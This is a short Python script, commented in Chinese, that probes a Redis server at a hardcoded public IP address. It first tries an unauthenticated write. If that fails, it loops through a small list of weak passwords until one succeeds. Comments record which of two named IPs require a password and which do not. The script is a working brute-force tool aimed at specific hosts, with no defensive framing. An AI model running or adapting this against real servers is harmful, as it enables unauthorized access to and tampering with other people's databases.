# coding:utf-8
'''
如果redis没设置密码，r.set('name', 'test')可以成功设置，通过r.get('name')可以取出
如果设置了密码，不传递password则返回NOAUTH Authentication required.
传递密码但错误返回invalid password
密码正确成功写入值
149.28.42.95 有密码
207.246.87.203 无密码
'''

import redis

ip = '149.28.42.95'
passwords = ['a', 'b', '123456', '789']
try:
    r = redis.Redis(host=ip, port=6379)
    r.set('name', 'test')
    print(r.get('name'))
except Exception as e:
    flag = 1
    while flag:
        for pwd in passwords:
            try:
                r = redis.Redis(host=ip, port=6379, password=pwd)
                r.set('name', 'test')
                print(pwd)
                flag = 0
                break
            except Exception as e:
                print(e)
        flag = 0